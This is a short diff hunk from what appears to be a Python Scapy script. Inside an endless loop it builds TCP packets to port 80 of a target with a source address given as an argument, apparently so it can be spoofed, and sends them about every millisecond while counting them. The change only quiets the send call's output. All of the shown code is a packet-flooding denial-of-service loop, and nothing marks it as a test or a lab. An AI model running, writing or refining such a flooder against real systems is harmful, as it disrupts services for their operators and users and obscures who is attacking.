@@ -14,6 +14,6 @@ while True:
     IP1 = IP(src=arguments.src, dst=arguments.target)
     TCP1 = TCP(sport=int(arguments.port), dport=80)
     package = IP1 / TCP1    #make package
-    send(package, inter=.001)   #inter: time interval to wait between two packages
+    send(package, inter=.001, verbose=False)   #inter: time interval to wait between two packages
     print("Number of packages: ", packages)
     packages += 1
